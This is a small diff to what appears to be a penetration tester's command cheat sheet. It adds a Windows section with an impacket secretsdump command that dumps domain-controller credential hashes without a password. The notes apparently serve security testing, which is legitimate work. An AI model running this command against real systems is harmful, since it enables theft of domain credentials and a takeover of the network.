@@ -152,6 +152,12 @@ gpg --import {file}.asc
 gpg --decrypt {file}.gpg
 
 ### windows
+https://wadcoms.github.io/
+
+#### impacket
+secretsdump.py -just-dc -no-pass {dcname}\$@{dcip}
+
+#### from a shell
 cd C:\Program Files (x86)
 dir
 
